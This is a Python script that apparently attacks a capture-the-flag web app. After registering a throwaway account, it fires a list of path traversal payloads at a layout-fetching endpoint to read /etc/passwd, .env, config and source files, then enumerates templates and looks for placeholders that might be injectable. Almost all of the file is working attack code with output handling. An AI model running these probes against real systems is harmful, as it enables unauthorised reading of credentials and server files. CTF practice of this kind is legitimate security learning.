import requests, re, random, string

BASE = "http://10.112.165.127:5000"

# Get a session
uname = "vec_" + "".join(random.choices(string.ascii_lowercase, k=4))
s = requests.Session()
s.post(f"{BASE}/register", data={"username": uname, "password": "Test1234!"}, allow_redirects=False)
s.post(f"{BASE}/login", data={"username": uname, "password": "Test1234!"}, allow_redirects=False)

# 1) Check what the layout template looks like
print("=== /api/fetch_layout?layout=theme_classic.html ===")
r = s.get(f"{BASE}/api/fetch_layout?layout=theme_classic.html")
print(f"Status: {r.status_code}, Length: {len(r.text)}")
print(r.text[:1000])
print("...")
print(r.text[-500:] if len(r.text) > 500 else "")

# 2) Path traversal on fetch_layout
print("\n=== Path Traversal Tests ===")
payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "../../../../etc/passwd",
    "../app.py",
    "../../app.py",
    "../../../app.py",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "../templates/admin.html",
    "../../templates/admin.html",
    "../config.py",
    "../../config.py",
    "../secret.txt",
    "../../secret.txt",
    "../.env",
    "../../.env",
    "flag",
    "flag.txt",
    "flag.html",
]

for p in payloads:
    r = s.get(f"{BASE}/api/fetch_layout?layout={p}", timeout=5)
    if r.status_code == 200 and len(r.text) > 10:
        content = r.text[:200].replace("\n", "\\n")
        interesting = "root:" in r.text or "THM{" in r.text or "import " in r.text or "SECRET" in r.text or "flag" in r.text.lower()
        marker = " *** INTERESTING ***" if interesting else ""
        print(f"  layout={p} -> {r.status_code} ({len(r.text)} bytes){marker}")
        if interesting:
            print(f"    {r.text[:500]}")
        else:
            print(f"    {content}")
    elif r.status_code != 200:
        print(f"  layout={p} -> {r.status_code}")

# 3) List available themes
print("\n=== Theme enumeration ===")
for name in ["theme_classic.html", "theme_modern.html", "theme_dark.html",
             "theme_valentine.html", "theme_cupid.html", "theme_admin.html",
             "theme_flag.html", "index.html", "base.html", "admin.html",
             "login.html", "register.html", "dashboard.html", "profile.html",
             "flag.html", "secret.html"]:
    r = s.get(f"{BASE}/api/fetch_layout?layout={name}", timeout=5)
    if r.status_code == 200 and len(r.text) > 10:
        snippet = r.text[:100].replace("\n", " ")
        print(f"  {name} -> {r.status_code} ({len(r.text)} bytes) | {snippet}")

# 4) Check if __BIO__ in template is in raw HTML context
print("\n=== __BIO__ context in theme template ===")
r = s.get(f"{BASE}/api/fetch_layout?layout=theme_classic.html")
for marker in ["__BIO__", "__USERNAME__", "__bio__", "__name__"]:
    idx = r.text.find(marker)
    if idx >= 0:
        print(f"  {marker} at char {idx}:")
        print(f"    ...{r.text[max(0,idx-100):idx+100]}...")
